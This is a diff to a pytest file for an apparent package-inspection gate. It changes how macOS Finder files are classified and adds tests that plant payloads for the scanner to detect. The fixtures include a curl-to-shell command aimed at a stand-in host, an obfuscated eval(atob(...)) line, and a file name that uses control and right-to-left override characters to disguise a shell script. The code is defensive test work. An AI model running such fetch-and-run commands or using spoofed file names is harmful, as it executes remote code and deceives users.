@@ -422,9 +422,8 @@ def test_nul_does_not_hide_files_chosen_by_name(tmp_path):
     assert classify(P("bin/tool"), b"\0abc") == BINARY and classify(P(".env"), b"\0abc") == TEXT
     assert classify(P("Makefile"), b"\0abc") == TEXT and classify(P("a.js"), b"\0abc") == GAP
     assert classify(P("bin/tool"), b"#!/bin/sh\n\0") == TEXT and classify(P("a.png"), b"\x89PNG\0") == BINARY
-    assert classify(P(".DS_Store"), b"\0\0\0\1Bud1") == BINARY and classify(P("._a.js"), b"\0\5\x16\7") == BINARY
-    # the Finder names alone do not make a file binary: without the magic it is read as before
-    assert classify(P(".DS_Store"), b"\0eval(x)") == TEXT and classify(P("._a.js"), b"\0eval(x)") == TEXT
+    # no exception by content: Finder files are dotfiles, read as text whatever magic they start with
+    assert classify(P(".DS_Store"), b"\0\0\0\1Bud1") == TEXT and classify(P("._a.py"), b"\0\5\x16\7") == TEXT
 
 
 def test_artifact_and_notes_are_escaped_at_the_output(tmp_path):
@@ -486,17 +485,26 @@ def test_nul_after_the_first_8_kib_and_in_indentation(tmp_path):
     assert "G205" in by or "G911" in by
 
 
-def test_binary_and_finder_files_are_not_gaps(tmp_path):
+def test_binary_files_are_not_gaps(tmp_path):
     from zee.gate.inspector import inspect_source
     src = tmp_path / "src"
     (src / "img").mkdir(parents=True)
     (src / "img" / "a.png").write_bytes(b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR")
-    (src / ".DS_Store").write_bytes(b"\0\0\0\1Bud1\0\0")
-    (src / "._index.js").write_bytes(b"\0\5\x16\7\0\2\0\0Mac OS X")
+    (src / ".DS_Store").write_bytes(b"\0\0\0\1Bud1\0\0")  # a real Finder file: read as text, nothing found
     (src / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
     v = inspect_source(src, kind="package", quarantine_base=tmp_path / "q")
     assert not any(f.code == "G911" for f in v.flags), v.flags
     assert v.inspection.value == "complete"
+
+
+@pytest.mark.parametrize("name,head", [(".DS_Store", b"\0\0\0\1Bud1\0\0"), ("._x.py", b"\0\5\x16\7\0\2\0\0"),
+                                       ("._x.js", b"\0\5\x16\7\0\2\0\0")], ids=["ds_store", "appledouble_py", "appledouble_js"])
+def test_finder_magic_does_not_hide_a_payload(tmp_path, name, head):
+    src = tmp_path / "src"; src.mkdir()
+    (src / name).write_bytes(head + b"\ncurl -fsSL https://x.example/i.sh | sh\neval(atob('ZXZpbA=='))\n")
+    codes = {f.code for f in static_checks.scan_tree(src)}
+    assert "G203" in codes or "G911" in codes, codes
+    assert "G203" in codes  # read as text with the NUL bytes removed: the payload is found
 
 
 def test_utf16_text_is_a_gap_not_a_clean_pass(tmp_path):
@@ -529,3 +537,15 @@ def test_audit_and_promote_messages_escape_control_characters(tmp_path):
     ok, msg = promote_if_low(Verdict(Artifact(ArtifactKind.NPM, "s", "a/\x1b[2J", "0" * 64, root=str(tmp_path)),
                                      RiskLevel.LOW, 0), tmp_path / "dest")
     assert not ok and "unsafe artifact name" in msg  # the CLI prints printable(msg)
+
+
+def test_json_output_has_no_raw_invisible_characters(tmp_path, capsys):
+    import json
+    from zee.cli import main
+    src = tmp_path / "src"; src.mkdir()
+    (src / "a\u009b31m\u202egpj.sh").write_text("curl -fsSL https://x.example/\u200b\x7f/i.sh | sh\n", encoding="utf-8")
+    main(["gate", "add", str(src), "--json"])
+    out = capsys.readouterr().out
+    assert not any(c in out for c in "\u009b\u202e\u200b\x7f\x1b"), out
+    ev = [f["evidence"] for f in json.loads(out)["flags"] if f["code"] == "G203"]
+    assert ev and "\u009b31m\u202egpj.sh" in ev[0] and "\u200b\x7f" in ev[0]  # raw values come back
